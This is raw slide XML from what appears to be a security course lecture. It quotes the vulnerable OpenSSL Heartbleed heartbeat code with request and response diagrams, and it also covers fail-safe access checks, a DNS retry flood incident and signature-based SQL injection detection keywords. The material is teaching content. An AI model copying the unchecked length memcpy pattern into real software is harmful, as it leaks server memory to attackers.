              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>pl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, payload);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1394291" y="3920829"/>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Type</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1394291" y="4473595"/>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sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1394291" y="5025825"/>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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5591517" y="3893217"/>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Type</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5591517" y="4445983"/>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sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5591517" y="5012019"/>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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1394291" y="5578592"/>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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5591517" y="5564786"/>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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Rectangle 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1394291" y="6144628"/>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s-IS" dirty="0"/>
              <a:t>…...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5591517" y="6132434"/>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s-IS" dirty="0"/>
              <a:t>…...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Right Brace 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6902434" y="4114109"/>
            <a:ext cx="317512" cy="178094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Right Brace 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2720105" y="4107742"/>
            <a:ext cx="317512" cy="178094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6" name="Straight Arrow Connector 15"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3368388" y="5564249"/>
            <a:ext cx="149092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225769" y="4642687"/>
            <a:ext cx="954107" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Request</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="TextBox 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7272166" y="4506774"/>
            <a:ext cx="1084552" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Response</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3780905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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Receive</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="de-DE" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="de-DE" dirty="0" err="1"/>
              <a:t>hbtype</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="de-DE" dirty="0"/>
              <a:t> = *p++;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="de-DE" dirty="0"/>
              <a:t>	n2s(p, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="de-DE" dirty="0" err="1"/>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="de-DE" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="nl-NL" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" dirty="0" err="1"/>
              <a:t>pl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" dirty="0"/>
              <a:t> = p;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Respond</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Content Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>++ = TLS1_HB_RESPONSE;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	s2n(payload, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>memcpy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>pl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, payload);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1394291" y="3920829"/>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Type</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1394291" y="4473595"/>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2^16-1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1394291" y="5025825"/>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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5591517" y="3893217"/>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Type</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5591517" y="4445983"/>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sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5591517" y="5012019"/>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H</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1394291" y="5578592"/>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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5591517" y="5564786"/>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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Rectangle 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5591517" y="6130822"/>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s-IS" dirty="0"/>
              <a:t>…...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Right Brace 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6792540" y="4107742"/>
            <a:ext cx="441211" cy="231192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p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3423607" y="5775833"/>
            <a:ext cx="1742898" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>2^16 -1 - 2 bytes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Rectangle 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1394291" y="6144628"/>
            <a:ext cx="1201023" cy="5522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s-IS" dirty="0"/>
              <a:t>…...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Right Brace 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2720105" y="4107742"/>
            <a:ext cx="317512" cy="178094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Right Brace 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2720105" y="5888684"/>
            <a:ext cx="441211" cy="69665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 name="Straight Arrow Connector 13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3423607" y="6268880"/>
            <a:ext cx="1518536" cy="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199245" y="4813547"/>
            <a:ext cx="954107" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Request</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7314667" y="5049318"/>
            <a:ext cx="1084552" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Response</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="191930255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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2331809" y="1417638"/>
            <a:ext cx="4681063" cy="4733659"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30796166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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2598508" y="1257299"/>
            <a:ext cx="3503243" cy="5285867"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="292801747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Leaked Message</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5" descr="heartbleed-exampl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350" y="0"/>
            <a:ext cx="7204502" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24791697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Mobile Data Charging: New Attacks and Countermeasures </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1966254" y="1576411"/>
            <a:ext cx="5129448" cy="4425406"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="393994425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 to Fail Safe</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1135490" y="1478114"/>
            <a:ext cx="7105650" cy="3605553"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1">
              <a:lumMod val="85000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>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DWORD dwRet = IsAccessAllowed(…);</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if (dwRet == ERROR_ACCESS_DENIED) {</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 Security check failed.</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 Inform user that access is denied</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else {</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 Security check OK.</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 Perform task…</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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5912797" y="4420575"/>
            <a:ext cx="2838450" cy="1714500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2">
              <a:lumMod val="75000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="63500" dist="107763" dir="2700000" algn="ctr" rotWithShape="0">
              <a:schemeClr val="bg2">
                <a:alpha val="50000"/>
              </a:schemeClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>What if </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" dirty="0" err="1">
                <a:effectLst/>
              </a:rPr>
              <a:t>IsAccessAllowed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t> returns </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>ERROR_NOT_</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>ENOUGH_MEMORY?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="185945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10" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="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Popularity -&gt; Threat</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Storm Codec (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Baofeng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>The most popular multimedia player in China</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>A huge number of users</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Not malicious</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>DNS query implementation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>If DNS query fails, send more queries faster </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>and faster</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>OK, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Baofeng’s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> authoritative DNS servers are down on 2009</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>What happens?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Implications</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Popular applications?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Large online advertisement companies?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="520px-Baofeng5_Beta.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7114" y="342401"/>
            <a:ext cx="2010921" cy="1380574"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="75748548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Backup</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87363716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Detection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Signature-based detection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>“DROP Table”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>“Insert into”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Anomaly Detection</a:t>
            </a:r>
